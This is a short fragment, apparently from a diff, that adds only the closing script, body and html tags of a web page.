+   </script>
+
+</body>
+   </html>
